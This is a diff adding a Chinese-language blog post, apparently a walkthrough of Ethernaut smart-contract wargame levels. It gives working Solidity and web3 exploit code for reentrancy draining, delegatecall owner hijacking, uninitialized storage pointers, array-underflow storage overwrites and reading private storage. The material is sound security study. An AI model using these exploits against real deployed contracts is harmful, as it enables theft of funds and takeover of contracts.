+        reInstance.withdraw(1 ether);
+    &#125;
+
+  function() public payable &#123;
+      if(address(reInstance).balance &gt;= 1 ether)&#123;
+        reInstance.withdraw(1 ether);
+      &#125;
+  &#125;
+&#125;
+</code></pre>
+<p>​	在这一关中，存在问题的主要重入攻击，通过构造一个恶意合约，在恶意合约的fallback函数中在次调用withdraw函数，反复执行取钱操作，知道题目合约余额为0。</p>
+<p>​	在上面的Poc中，我们先使用callDonate存入一笔资金以满足调用withdraw的条件，这里需要注意的是在Remix中调用callDonate之前需要修改value为1 ether。</p>
+<p><img src="img7.png" alt="img7"></p>
+<p>​	就是这里卡了我很久，因为对Remix使用的不熟悉，起初以为只有在部署合约的时候才会修改value的值，没有想过在函数调用的时候也需要用到。</p>
+<p>​	除了这个问题，还有一个很大的问题，就是 OOG问题 ，即Out of gas。 在本地测试不会遇到。这是因为默认的Gas设置不能满足重入的需求，可以手动修改gas的量。 </p>
+<p><img src="img8.png" alt="img8"></p>
+<p>大佬还注意到了一个额外的问题：</p>
+<blockquote>
+<p> 顺便一提，本体其实还有整数下溢的问题。 </p>
+</blockquote>
+<p> <code>await getBalance(contract.address)</code>查看合约总余额。为0，则代表通关。 </p>
+<p>关键：</p>
+<ul>
+<li>out of gas 问题</li>
+<li>Remix的使用</li>
+<li>THE DAO事件</li>
+<li>重入漏洞</li>
+</ul>
+<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>通关条件：</p>
+<ul>
+<li>到达电梯顶部</li>
+</ul>
+<p>Poc:</p>
+<pre><code>pragma solidity ^0.4.18;
+
+contract Elevator &#123;
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public;
+&#125;
+
+contract BuildingPoc &#123;
+
+    Elevator ele;
+    bool t = true;
+
+    function isLastFloor(uint) view public returns (bool)&#123;
+        t = !t;
+        return t;
+    &#125;
+    
+    function attack(address _addr) public&#123;
+        ele = Elevator(_addr);
+        ele.goTo(5);
+    &#125;
+&#125;
+</code></pre>
+<p>​	简单分析一下：</p>
+<p>​	题目中给出了一个接口Building，其中有一个isLastFloor函数，而合约Elevator中我们能调用的只有goTo函数。bool类型的top变量代表了是否到达顶层，要通过我们就需要将top赋予true，而在goTo函数中，top &#x3D; building.isLastFloor(floor)，我们只要能将isLastFloor的返回值变为true即可通关。isLastFloor总共有两次返回值，只要第一次返回false，第二次返回true即可。</p>
+<p>​	通过以后，题目给出了另一个解决办法：构建一个视图函数。例如 gasleft()</p>
+<p>​	暂时还没想到该怎么利用，待更新··· ···</p>
+<p>关键：</p>
+<ul>
+<li>函数即使被修饰了pure、view等修饰符，虽然会有警告，但还是可以修改状态变量的。</li>
+</ul>
+<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>通关条件：</p>
+<ul>
+<li>解锁合约</li>
+</ul>
+<p>第一种方式是大佬的：</p>
+<p>​	直接使用web3 api的 web3.eth.getStorageAt</p>
+<p>Poc：</p>
+<pre><code class="javascript">web3.eth.getStorageAt(&quot;0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0&quot;, 0,function(x,y)&#123;console.info(y);&#125;)
+0x000000000000000000000000000000000000000000000000000000d80cff0a01
+web3.eth.getStorageAt(&quot;0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0&quot;, 1,function(x,y)&#123;console.info(y);&#125;)
+0x47dac1a874d4d1f852075da0347307d6fcfef2a6ca6804ffda7b54e02df5c359
+web3.eth.getStorageAt(&quot;0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0&quot;, 2,function(x,y)&#123;console.info(y);&#125;)
+0x06080b7822355f604ab68183a2f2a88e2b5be84a34e590605503cf17aec66668
+web3.eth.getStorageAt(&quot;0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0&quot;, 3,function(x,y)&#123;console.info(y);&#125;)
+0xd42c0162aa0829887dbd2741259c97ca54fb1a26da7098de6a3697d6c4663b93
+web3.eth.getStorageAt(&quot;0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0&quot;, 4,function(x,y)&#123;console.info(y);&#125;)
+0x0000000000000000000000000000000000000000000000000000000000000000
+</code></pre>
+<p>大佬的分析：</p>
+<blockquote>
+<p>根据 solidity 文档中的变量存储原则，evm 每一次处理 32 个字节，而不足 32 字节的变量相互共享并补齐 32 字节。<br>那么我们简单分析下题目中的变量们：</p>
+<pre><code class="javascript">bool public locked = true;  //1 字节 01
+uint256 public constant ID = block.timestamp; //32 字节
+uint8 private flattening = 10; //1 字节 0a
+uint8 private denomination = 255;//1 字节 ff
+uint16 private awkwardness = uint16(now);//2 字节
+
+bytes32[3] private data;
+</code></pre>
+<p>那么第一个 32 字节就是由<code>locked</code>、<code>flattening</code>、<code>denomination</code>、<code>awkwardness</code>组成，另外由于常量是无需存储的，所以从第二个 32 字节起就是 data。<br>那么 data[2] 就是<code>0xd42c0162aa0829887dbd2741259c97ca54fb1a26da7098de6a3697d6c4663b93</code>，<br>注意这里进行了强制类型转换将 data[2] 转换成了 bytes16，那么我们取前 16 字节即可。<br>执行 unlock 即可。</p>
+</blockquote>
+<p>执行：contract.unlock(‘0xd42c0162aa0829887dbd2741259c97ca’)</p>
+<p>over!</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/148341#h2-12">Zeppelin Ethernaut writeup</a></p>
+<p>上面那篇文章使用的是contract.unlock(web3.toAscii(‘0xd42c0162aa0829887dbd2741259c97ca’))，不知道为什么会出现 ”ALERT: 交易出错. 合约代码执行异常. “错误，看啥时候能解决这个问题吧。</p>
+<p>关键：</p>
+<ul>
+<li>使用web3.getStorageAt读取指定地址数据</li>
+<li>evm每次处理32字节</li>
+<li>根据 Solidity 优化规则，当变量所占空间小于 32 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。 </li>
+<li>常量无需存储 </li>
+<li>使用了slice切割字符</li>
+</ul>
+<h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><p>通关条件：</p>
+<ul>
+<li>满足gateOne、gateTwo、gateThree的所有条件42</li>
+</ul>
+<p>​	gateOne只要满足msg.sender !&#x3D; tx.origin即可，相信通过前面的关卡这时小菜一碟，只需要创建一个新合约，在合约内部再去调用题目合约即可。</p>
+<p>​	gateTwo折磨了我很久很久，总是过不了，看了大佬的POC和分析还是过不了，最后才发现是自己的理解能力不够（太菜了）。gateTwo只要满足进行mod运算时的gas是8191的整数倍即可。</p>
+<p>​	在Remix中可以利用debug功能来确定gas应该传入多少，如下图所示，现在本地测试网络进行测试：</p>
+<p><img src="img1.png" alt="img1"></p>
+<p>​	然后调用attack进行debug：</p>
+<p><img src="img2.png" alt="img2"></p>
+<p>​	在很多大佬的writeUp中所讲的走到DUP2这里， remaining gas应该是8191的整数倍。我开始也是这样的做的，但是这样计算出来的gas就和大佬们的不一样，在本地测试网络中能够跑通，在题目环境中就没办法跑通，这个困扰了我很长一段时间。后来才知道能够在Etherscan上查看每一步的gas消耗，如下图所示：</p>
+<p>查看地址： <a target="_blank" rel="noopener" href="https://ropsten.etherscan.io/vmtrace?txhash=0xff4a3aed71c20cfe9109403040d1e7f4cd9d77d62dc8cd3205066c3ca5e565c0">https://ropsten.etherscan.io/vmtrace?txhash=0xff4a3aed71c20cfe9109403040d1e7f4cd9d77d62dc8cd3205066c3ca5e565c0</a> （将txhash后的交易hash改为自己的即可）</p>
+<p><img src="img3.png" alt="img3"></p>
+<p>​	在查看了gas消耗情况之后发现，本地显示的gas和这里显示的有所区别，本地能够跑通的在这里会无法满足，在走到DUP2这一步时不是8191的整数倍。而满足了这里的整数倍的数据，在本地发现跑不通了，这个问题暂时不知道是什么情况，目前了解还是太少了，等日后有能力再来解决吧。</p>
+<p>​	接下来是gateThree，gateThree有三个条件：</p>
+<pre><code>uint32(_gateKey) == uint16(_gateKey)
+uint32(_gateKey) != uint64(_gateKey)
+uint32(_gateKey) == uint16(tx.origin)
+</code></pre>
+<p>​	无符号整型可以转换成跟它大小相等或更大的字节类型，但反之不能 。</p>
+<p>​	要满足第三个条件只需要_gatekey的前4字节全为0，后4字节为tx.origin的最后4字节，拿我的地址 0x2eb4081c419d1890eb0Af97ce5A9689Cad2fe3da 为例，构造一个0x0000e3da即可，这样可以发现同时满足了第一个条件。</p>
+<p>​	还剩第二个条件，uint32(_gatekey)在与uint64进行比较时会由0x0000e3da转换为0x000000000000e3da,要使二者不相等只要gatekey的前半部分不为全0即可，我构造的是：0xFFFFFFFF0000733c（最后四个字节必须改为自己地址的最后4位)。</p>
+<p>​	于是最终的Poc：</p>
+<pre><code>pragma solidity ^0.4.18;
+
+contract GatekeeperOne &#123;
+
+  address public entrant;
+
+  modifier gateOne() &#123;
+    require(msg.sender != tx.origin);
+    _;
+  &#125;
+
+  modifier gateTwo() &#123;
+    require(msg.gas % 8191 == 0);
+    _;
+  &#125;
+
+  modifier gateThree(bytes8 _gateKey) &#123;
+    require(uint32(_gateKey) == uint16(_gateKey));
+    require(uint32(_gateKey) != uint64(_gateKey));
+    require(uint32(_gateKey) == uint16(tx.origin));
+    _;
+  &#125;
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;
+    entrant = tx.origin;
+    return true;
+  &#125;
+&#125;
+
+contract GatekeeperOnePoc &#123;
+    
+    GatekeeperOne one;
+    
+    function GatekeeperOnePoc(address _addr) public&#123;
+        one = GatekeeperOne(_addr);
+    &#125;
+    
+    function attack() public&#123;
+        one.call.gas(819315)(bytes4(keccak256(&quot;enter(bytes8)&quot;)), bytes8(0xFFFFFFFF0000733c));
+    &#125;
+&#125;
+</code></pre>
+<p>​	我们可以通过await contract.entrant()来查看是否完成了通关条件，如果完成，返回值应该是你自己的地址。</p>
+<p>关键：</p>
+<ul>
+<li>debug的使用</li>
+<li>etherscan gas消耗详情的查看</li>
+<li>uint比较的方式</li>
+<li>call对gas的控制以及函数的调用</li>
+</ul>
+<h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><p>通关条件：</p>
+<ul>
+<li>与上关差不多，也是满足 modeifier的几个条件即可</li>
+</ul>
+<p>​	gateOne没啥可说的，依旧是合约调用合约即可。</p>
+<p>​	gateTwo直接引用大佬的分析吧。</p>
+<blockquote>
+<p>gateTwo 中 extcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编，来获取调用方(caller)的代码大小，一般来说，caller 为合约时，获取的大小为合约字节码大小，caller 为账户时，获取的大小为 0 。</p>
+<p>条件为调用方代码大小为 0 ，但这又与 gateOne 冲突了。经过研究发现，当合约在初始化，还未完全创建时，代码大小是可以为0的。因此，我们需要把攻击合约的调用操作写在 <code>constructor</code> 构造函数中。</p>
+</blockquote>
+<p>Poc：</p>
+<pre><code>pragma solidity ^0.4.18;
+
+contract GatekeeperTwo &#123;
+
+  address public entrant;
+
+  modifier gateOne() &#123;
+    require(msg.sender != tx.origin);
+    _;
+  &#125;
+
+  modifier gateTwo() &#123;
+    uint x;
+    assembly &#123; x := extcodesize(caller) &#125;
+    require(x == 0);
+    _;
+  &#125;
+
+  modifier gateThree(bytes8 _gateKey) &#123;
+    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
+    _;
+  &#125;
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;
+    entrant = tx.origin;
+    return true;
+  &#125;
+&#125;
+
+contract GatekeeperTwoPoc &#123;
+    
+     uint64 public mask = 0xFFFFFFFFFFFFFFFF;
+    
+    function GatekeeperTwoPoc(address _addr)&#123;
+        GatekeeperTwo target = GatekeeperTwo(_addr);
+        uint64 res =  uint64(keccak256(this)) ^ mask;
+        target.enter(bytes8(res));
+    &#125;
+&#125;
+</code></pre>
+<p>关键：</p>
+<ul>
+<li>extcidesize获取指定地址合约代码大小<ul>
+<li>地址为合约时，获取大小为合约字节码大小</li>
+<li>地址为账户时，获取的大小为0</li>
+</ul>
+</li>
+<li>当合约在初始化，还未完全创建时，代码大小是可以为0的 </li>
+<li>异或两次后得到的数据是原数据</li>
+</ul>
+<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><p>通关条件：</p>
+<ul>
+<li>使token变为0</li>
+</ul>
+<p>​	首先我们需要知道什么是<a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-20">ERC20</a>,然后，直接看大佬的分析吧！</p>
+<blockquote>
+<p>既然子合约没有什么问题，那我们看看 import 的父合约<br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/aragon/zeppelin-solidity/blob/master/contracts/token/StandardToken.sol">StandardToken.sol</a>，其其实根据 ERC20 的标准我们也知道，转账有两个函数，一个<code>transfer</code>一个<code>transferFrom</code>，题目中代码只重写了<code>transfer</code>函数，那未重写<code>transferFrom</code>就是一个可利用的点了。直接看看<code>StandardToken.sol</code>代码：</p>
+<pre><code>contract StandardToken &#123;
+ using ERC20Lib for ERC20Lib.TokenStorage;
+ ERC20Lib.TokenStorage token;
+ ...
+ function transfer(address to, uint value) returns (bool ok) &#123;
+      return token.transfer(to, value);
+    &#125;
+
+ function transferFrom(address from, address to, uint value) returns (bool ok) &#123;
+      return token.transferFrom(from, to, value);
+    &#125;
+ ...
+&#125;
+</code></pre>
+<p>跟进<code>ERC20Lib.sol</code>： </p>
+<pre><code>library ERC20Lib &#123;
+ ...
+ function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) &#123;
+     self.balances[msg.sender] = self.balances[msg.sender].minus(_value);
+     self.balances[_to] = self.balances[_to].plus(_value);
+     Transfer(msg.sender, _to, _value);
+     return true;
+ &#125;
+
+ function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) &#123;
+     var _allowance = self.allowed[_from](msg.sender);
+
+     self.balances[_to] = self.balances[_to].plus(_value);
+     self.balances[_from] = self.balances[_from].minus(_value);
+     self.allowed[_from](msg.sender) = _allowance.minus(_value);
+     Transfer(_from, _to, _value);
+     return true;
+ &#125;
+ ...
+ function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) &#123;
+     self.allowed[msg.sender](_spender) = _value;
+     Approval(msg.sender, _spender, _value);
+     return true;
+ &#125;
+&#125;
+</code></pre>
+<p>可以直接调用这个<code>transferFrom</code>即可了。但是<code>transferFrom</code>有一步权限验证，要验证这个<code>msg.sender</code>是否被<code>_from</code>（实际上在这里的情景的就是自己是否给自己授权了），那么我们同时还可以调用 approve 给自己授权。</p>
+<p>Poc:</p>
+<pre><code>await contract.approve(player,toWei(1000000))
+await contract.transferFrom(player,contract.address,toWei(1000000))
+</code></pre>
+</blockquote>
+<p>关键：</p>
+<ul>
+<li>ERC20的转账操作函数</li>
+</ul>
+<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>通关条件：</p>
+<ul>
+<li>获得合约所有权</li>
+</ul>
+<blockquote>
+<p>delegatecall：进行函数调用时代码是在调用函数的环境里执行</p>
+<p>call：call调用其他合约的函数时，代码是在被调用的合约的环境里执行的</p>
+</blockquote>
+<p>for example：</p>
+<pre><code>pragma solidity ^0.4.18;
+
+contract a &#123;
+    uint a1;
+    
+    function a0(address test) public &#123;
+        test.delegatecall(bytes4(keccak256(&quot;b0()&quot;)));
+    &#125;
+    
+    function getA1() returns(uint) &#123;
+        return a1;
+    &#125;
+&#125;
+
+contract b &#123;
+    uint b1; 
+
+    function b0() public &#123;
+        b1 = 1111;
+    &#125;
+    
+    function getB1() public returns(uint) &#123;
+        return b1;
+    &#125;
+&#125;
+</code></pre>
+<p>​	在上述代码中，如果调用a0函数，看起来是在a0中调用合约b中的b0将b1的值修改为了1111，实际上分别调用getA1和getB1可以发现，被赋值1111的是a1而不是b1。这正是delegatecall调用其他合约中函数的特性，代码是在a合约的环境中执行的，操作的也是a合约的 storage 。</p>
+<p>引用大佬分析：</p>
+<blockquote>
+<p>所以这个题就很好办了，我们调用<code>Preservation</code>的<code>setFirstTime</code>函数时候实际通过 delegatecall 执行了<code>LibraryContract</code>的<code>setTime</code>函数，修改了<code>timeZone1Library</code>变量。<br>这样，我们第一次调用<code>setFirstTime</code>将<code>timeZone1Library</code>变量修改为我们的恶意合约的地址，第二次调用<code>setFirstTime</code>就可以执行我们的任意代码了。</p>
+</blockquote>
+<p>Poc:</p>
+<pre><code>pragma solidity ^0.4.23;
+
+contract PreservationPoc &#123;
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+  uint storedTime;
+  
+  function setTime(uint _time) public &#123;
+    owner = address(_time);
+  &#125;
+&#125;
+</code></pre>
+<pre><code>//修改为恶意合约地址
+await contract.setFirstTime(&quot;0xBF85F10dADb216Ca5093dF8238dE314d9BB7d407&quot;)
+//修改为自己的地址
+await contract.setFirstTime(&quot;0x2eb4081c419d1890eb0af97ce5a9689cad2fe3da&quot;)
+</code></pre>
+<p>​	第一次调用setFirstTime是将恶意合约地址作为参数传给LiberayContract合约中setTime的参数，然后在setTime中将恶意合约地址赋给storedTime,由于delegatecall调用的特性，实际上恶意合约地址被赋给了timeZone1Library。然后第二次调用setFirstTime的时候，调用delegatecall的地址变成了恶意合约的地址，执行了恶意合约方法，将自己的地址赋值给了owner变量。</p>
+<p>​	使用await contract.owner()查看合约拥有者，如果是自己地址，那么恭喜，你通关了。</p>
+<p>大佬还有一句话：</p>
+<blockquote>
+<p> 函数中的局部变量默认为存储或内存，具体取决于其类型。未初始化的本地存储变量可以指向合约中的其他意外存储变量，从而导致故意（即开发人员故意将它们放在那里进行攻击）或无意的漏洞。 </p>
+</blockquote>
+<p>关键;</p>
+<ul>
+<li>delegatecall调用其他合约函数的特点</li>
+<li>uint类型可以存储地址</li>
+</ul>
+<h2 id="Locked"><a href="#Locked" class="headerlink" title="Locked"></a>Locked</h2><p>通关条件：</p>
+<ul>
+<li>解锁registrar</li>
+</ul>
+<p>​	照旧贴大佬分析：</p>
+<blockquote>
+<p>为了讨论这个漏洞，首先我们需要了解存储（Storage）在 Solidity 中的工作方式。作为一个高度抽象的概述（没有任何适当的技术细节——我建议阅读 Solidity 文档以进行适当的审查），状态变量按它们出现在合约中的顺序存储在合约的 <em>Slot</em> 中（它们可以被组合在一起，但在本例中不可以，所以我们不用担心）。因此， <code>unlocked</code> 存在 <code>slot 0</code> 中， <code>registeredNameRecord</code> 存在 <code>slot 1</code> 中， <code>resolve</code> 在 <code>slot 2</code> 中，等等。这些 slot 的大小是 32 字节（映射会让事情更加复杂，但我们暂时忽略）。如果 <code>unlocked</code> 是 <code>false</code> ，其布尔值看起来会是 <code>0x000...0</code>（64 个 0，不包括 <code>0x</code> ）；如果是 <code>true</code> ，则其布尔值会是 <code>0x000...1</code> （63 个 0）。正如你所看到的，在这个特殊的例子中，存储上存在着很大的浪费。</p>
+<p>我们需要的另一部分知识，是 Solidity 会在将复杂的数据类型，比如 <code>structs</code> ，初始化为局部变量时，默认使用 storage 来存储。因此，在 [16] 行中的 <code>newRecord</code> 默认为storage。合约的漏洞是由 <code>newRecord</code> 未初始化导致的。由于它默认为 storage，因此它成为指向 storage 的指针；并且由于它未初始化，它指向 slot 0（即 <code>unlocked</code> 的存储位置）。请注意，[17] 行和[18] 行中，我们将 <code>_name</code> 设为 <code>nameRecord.name</code> 、将 <code>_mappedAddress</code> 设为 <code>nameRecord.mappedAddress</code> 的操作，实际上改变了 slot 0 和 slot 1 的存储位置，也就是改变了 <code>unlocked</code> 和与 <code>registeredNameRecord</code> 相关联的 slot。</p>
+<p>这意味着我们可以通过 <code>register()</code> 函数的 <code>bytes32 _name</code> 参数直接修改 <code>unlocked</code> 。因此，如果 <code>_name</code> 的最后一个字节为非零，它将修改 slot 0 的最后一个字节并直接将 <code>unlocked</code> 转为 <code>true</code> 。就在我们将 <code>unlocked</code> 设置为 <code>true</code> 之时，这样的 <code>_name</code> 值将传入 [23] 行的 <code>require()</code> 函数。在Remix中试试这个。注意如果你的 <code>_name</code> 使用下面形式，函数会通过： <code>0x0000000000000000000000000000000000000000000000000000000000000001</code></p>
+</blockquote>
+<p>Poc：</p>
+<pre><code>pragma solidity ^0.4.23; 
+
+// A Locked Name Registrar
+contract Locked &#123;
+
+    bool public unlocked = false;  // registrar locked, no name updates
+    
+    struct NameRecord &#123; // map hashes to addresses
+        bytes32 name; // 
+        address mappedAddress;
+    &#125;
+
+    mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names 
+    mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses
+    
+    function register(bytes32 _name, address _mappedAddress) public &#123;
+        // set up the new NameRecord
+        NameRecord newRecord;
+        newRecord.name = _name;
+        newRecord.mappedAddress = _mappedAddress; 
+
+        resolve[_name] = _mappedAddress;
+        registeredNameRecord[msg.sender] = newRecord; 
+
+        require(unlocked); // only allow registrations if contract is unlocked
+    &#125;
+&#125;
+
+contract LockedPoc &#123;
+    function hack(address target) public &#123;
+        Locked lock = Locked(target);
+        lock.register(bytes32(1),address(msg.sender));
+    &#125;
+&#125;
+</code></pre>
+<p>​	struct 初始化为局部变量时，默认使用 storage 来存储，它成为指向 storage 的指针；并且由于它未初始化，它指向 slot 0（即 <code>unlocked</code> 的存储位置） 。在其他文章看到的都是结论很少有完全解释清楚原理的，留个疑问，看以后能不能解决吧。</p>
+<p>关键：</p>
+<ul>
+<li>存储在solidity的工作方式</li>
+</ul>
+<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>通关条件：</p>
+<ul>
+<li>从丢失的合同中找回0.5 ether</li>
+</ul>
+<p>​	由于区块链一切都是透明的，所以我们可以通过etherscan直接查询到丢失合约的地址。</p>
+<p><img src="img5.png" alt="img5"></p>
+<p>​	箭头所指就是新建的token合约地址，通过Remix的At address功能，我们可以直接操作已部署在链上的合约。</p>
+<p><img src="img6.png" alt="img6"></p>
+<p>​	通过destroy函数我们可以将合约自毁并将那0.5 ether取出。</p>
+<p><img src="img4.png" alt="img4"></p>
+<p>​	可以看到调用destroy后，合约自毁，并将余额全部转入我的钱包了。</p>
+<p>​	在Remix中还可以通过部署合约来调用destroy来转出余额，这样的方式相比使用At Address要略显麻烦一些，不过也是一种方式。</p>
+<p>Poc：</p>
+<pre><code>pragma solidity ^0.4.23;
+
+contract SimpleToken &#123;
+
+  // public variables
+  string public name;
+  mapping (address =&gt; uint) public balances;
+
+  // collect ether in return for tokens
+  function() public payable ;
+
+  // allow transfers of tokens
+  function transfer(address _to, uint _amount) public ;
+
+  // clean up after ourselves
+  function destroy(address _to) public ;
+&#125;
+
+contract RecoveryPoc &#123;
+    SimpleToken target;
+    constructor(address _addr) public&#123;
+        target = SimpleToken(_addr);
+    &#125;
+
+    function attack() public&#123;
+        target.destroy(tx.origin);
+    &#125; 
+&#125;
+</code></pre>
+<p>​	还有一种更加麻烦的方式是自己计算合约地址，可以看这篇文章——<a target="_blank" rel="noopener" href="https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3">Ethernaut Lvl 18 Recovery Walkthrough: How to retrieve lost contract addresses (in 2 ways)</a>。</p>
+<p>​	 public a &#x3D; address（keccak256（0xd6,0x94，YOUR_ADDR，0x01））</p>
+<p>​	通关后还给出了一篇文章介绍了一种隐秘且危险的方式存储ether： <a target="_blank" rel="noopener" href="https://swende.se/blog/Ethereum_quirks_and_vulns.html">https://swende.se/blog/Ethereum_quirks_and_vulns.html</a> </p>
+<p>关键：</p>
+<ul>
+<li>区块链上一切都是透明的</li>
+<li>如何找回丢失的地址</li>
+<li>selfdestroy的使用</li>
+</ul>
+<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><p>通关条件：</p>
+<ul>
+<li>使用正确的数字响应题目合约</li>
+</ul>
+<p>​	先放大佬的Poc吧：</p>
+<pre><code>var bytecode = &quot;0x600a600c600039600a6000f3602A60805260206080f3&quot;;
+web3.eth.sendTransaction(&#123; from: player, data: bytecode &#125;, function(err,res)&#123;console.log(res)&#125;);
+await contract.setSolver(&quot;contract address&quot;);
+</code></pre>
+<p>​	字节码的生成可以参考这篇文章：<a target="_blank" rel="noopener" href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes</a></p>
+<p>​	生命的意义： <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/42/16630643?fr=aladdin">https://baike.baidu.com/item/42/16630643?fr=aladdin</a> </p>
+<p>​	合约创建相关： <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d9137e87c9d3">https://www.jianshu.com/p/d9137e87c9d3</a> </p>
+<p>​	接下来回到这道题吧，题目要求使用正确的数字响应合约。由题目代码可以初步判断返回数字应该是42，这个42的由来可以看上面生命的意义的百科，还有个要求是代码最多10个操作码，这个时候使用remix来部署合约就有点不现实了。我们可以使用web3.eth提供的sendTransaction来部署合约，for example：</p>
+<pre><code>// using the callback
+web3.eth.sendTransaction(&#123;
+    from: &#39;0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe&#39;,
+    data: code // deploying a contract
+&#125;, function(error, hash)&#123;
+    ...
+&#125;);
+</code></pre>
+<p>​	from的值在题目中可以由player代替，data的code需要看字节码生成那篇文章了，由于水平有限，我还不能理解T.T。不过有一点需要注意，那篇文章中所返回的是0x42并不是42，所以我们需要吧42修改为2A,即0x2A&#x3D;42。</p>
+<p>​	使用sendTransaction部署合约后，可以通过返回的交易哈希来获取合约地址，然后将contrant address替换为合约地址即可。</p>
+<p>关键：</p>
+<ul>
+<li>生命的意义</li>
+<li>使用opcode创建合约</li>
+<li>web3.eth.sendTransaction的使用</li>
+<li>EVM汇编</li>
+</ul>
+<h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><p>通关条件：</p>
+<ul>
+<li>声明合约所有权</li>
+</ul>
+<p>​	 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/ownership/Ownable.sol"><code>Ownable.sol</code>源码传送门</a> </p>
+<p>​	首先面对的问题是modifier contacted，所有函数都包含它，所以必须先是contact为true。</p>
+<p>​	make_contact能够帮我们做到，唯一条件是传入一个长度大于2**200的数组，由于这里没有对数组内容进行检测，仅仅是检测了数组长度，所以我们可以伪造。</p>
+<p>​	修改contactPoc：</p>
+<pre><code>sig = web3.sha3(&quot;make_contact(bytes32[])&quot;).slice(0,10)
+// &quot;0x1d3d4c0b&quot;
+// 函数选择器
+data1 = &quot;0000000000000000000000000000000000000000000000000000000000000020&quot;
+// 除去函数选择器，数组长度的存储从第 0x20 位开始
+data2 = &quot;1000000000000000000000000000000000000000000000000000000000000001&quot;
+// 数组的长度
+await contract.contact()
+// false
+contract.sendTransaction(&#123;data: sig + data1 + data2&#125;);
+// 发送交易
+await contract.contact()
+// true
+</code></pre>
+<p>​	solidity中计算存储位时使用公式为：<br>$$<br>keccak256(slot) + index<br>$$</p>
+<blockquote>
+<p>之后就是一个经典的 OOB (out of boundary) Attack</p>
+<p>首先通过调用 <code>retract()</code>，使得 <code>codex</code> 数组长度下溢。</p>
+<pre><code class="javascript">web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(y)&#125;);
+// codex.length
+// 0x0000000000000000000000000000000000000000000000000000000000000000
+
+contract.retract()
+// codex.length--
+
+web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(y)&#125;);
+// codex.length
+// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</code></pre>
+<p>还需要了解一些 Solidity 中各种变量的存储方式。<br>这里推荐知道创宇的一篇文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/blockchain-articles/177260.html">https://www.freebuf.com/articles/blockchain-articles/177260.html</a></p>
+<p>可以简单将动态数组内变量的存储位计算方法概括为：<br><code>b[X] == SLOAD(keccak256(slot) + X)</code></p>
+<p>在本题中，数组 codex 的 slot 为 1，同时也是存储数组长度的地方。</p>
+<pre><code class="python">&gt;&gt;&gt; import sha3
+&gt;&gt;&gt; import binascii
+&gt;&gt;&gt; def bytes32(i):
+&gt;&gt;&gt;     return binascii.unhexlify(&#39;%064x&#39;%i)
+&gt;&gt;&gt; sha3.keccak_256(bytes32(1)).hexdigest()
+&#39;b10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6&#39;
+&gt;&gt;&gt; 2**256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
+35707666377435648211887908874984608119992236509074197713628505308453184860938
+</code></pre>
+<p>可计算出，<code>codex[35707666377435648211887908874984608119992236509074197713628505308453184860938]</code> 对应的存储位就是 slot 0。</p>
+<p>之前提到 slot 0 中同时存储了 <code>contact</code> 和 <code>owner</code>，只需将 <code>owner</code> 替换为 player 地址即可。</p>
+<pre><code>await contract.owner()
+// &quot;0x73048cec9010e92c298b016966bde1cc47299df5&quot;
+contract.revise(&#39;35707666377435648211887908874984608119992236509074197713628505308453184860938&#39;,&#39;0x000000000000000000000001676ca875027fd9a5bdbd4f1f0380d8f34d8e1cdf&#39;)
+// 调用 revise()
+await contract.owner()
+// &quot;0x676ca875027fd9a5bdbd4f1f0380d8f34d8e1cdf&quot;
+// Submit instance
+</code></pre>
+</blockquote>
+<p>​	参考文档：</p>
